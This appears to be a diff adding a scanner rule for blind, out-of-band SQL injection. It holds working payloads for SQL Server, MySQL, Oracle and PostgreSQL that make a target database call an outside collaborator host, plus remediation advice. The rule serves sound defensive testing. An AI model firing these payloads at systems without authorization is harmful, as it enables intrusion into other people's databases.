@@ -1,0 +1,35 @@
+id: sqli-oob
+name: SQL Injection (blind, OAST-confirmed out-of-band)
+family: sqli
+severity: high
+cwe: CWE-89
+owasp: WSTG-INPV-05
+cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+inject_into: [query, body, json]
+payloads:
+  # The database itself makes an out-of-band DNS/HTTP request to the collaborator. A correlated callback
+  # confirms SQL execution with ZERO false positives even when there is no error, no boolean difference
+  # and no timing signal — the blind case the error/boolean/time rules miss. OAST-gated: worst case is
+  # simply no callback. {{oast_domain}} is a bare host (for UNC/DNS), {{oast_url}} a full URL (for HTTP).
+  #
+  # Microsoft SQL Server — xp_dirtree walks a UNC path, so the server resolves the collaborator host:
+  - "'; EXEC master..xp_dirtree '\\\\{{oast_domain}}\\x'-- -"
+  - "'; EXEC master..xp_fileexist '\\\\{{oast_domain}}\\x'-- -"
+  - "1; EXEC master..xp_dirtree '\\\\{{oast_domain}}\\x'-- -"
+  # MySQL (Windows) — LOAD_FILE on a UNC path triggers an SMB/DNS lookup of the collaborator:
+  - "' UNION SELECT LOAD_FILE('\\\\x.{{oast_domain}}\\a')-- -"
+  - "' AND LOAD_FILE('\\\\x.{{oast_domain}}\\a')-- -"
+  # Oracle — UTL_INADDR resolves a host (DNS), UTL_HTTP fetches a URL (HTTP), in a string context:
+  - "'||(SELECT UTL_INADDR.get_host_address('{{oast_domain}}') FROM dual)||'"
+  - "'||(SELECT UTL_HTTP.request('{{oast_url}}') FROM dual)||'"
+  # PostgreSQL — dblink_connect attempts a connection to the collaborator host (DNS at minimum):
+  - "'; SELECT dblink_connect('host={{oast_domain}} user=a dbname=a')-- -"
+oracle:
+  type: any_of
+  checks:
+    - type: oob
+confirm_reproducible: false
+remediation: >-
+  Usa consultas parametrizadas (prepared statements) y nunca construyas SQL concatenando entrada del
+  usuario. Restringe los privilegios de la cuenta de BD (sin xp_dirtree/xp_cmdshell, sin UTL_HTTP/
+  UTL_INADDR, sin LOAD_FILE ni dblink) y aísla la red para que la BD no pueda hacer peticiones salientes.
